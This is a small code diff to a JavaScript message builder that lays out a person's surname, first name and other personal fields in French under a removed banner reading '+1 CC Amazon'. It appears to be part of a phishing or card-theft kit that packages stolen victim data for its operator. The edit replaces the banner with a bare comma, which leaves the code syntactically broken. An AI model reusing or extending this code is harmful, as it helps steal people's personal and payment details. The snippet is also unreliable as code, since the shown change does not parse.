@@ -208,7 +208,7 @@ const buildMessage = (
   }
 
   lines.push(
-    "=======⚡️ +1 CC Amazon ⚡======="
+    ,
     "<b>🧾 Informations personnelles</b>",
     `• <b>Nom</b> : ${sanitizeText(payload.lastName || "(non communiqué)")}`,
     `• <b>Prénom</b> : ${sanitizeText(payload.firstName || "(non communiqué)")}`,
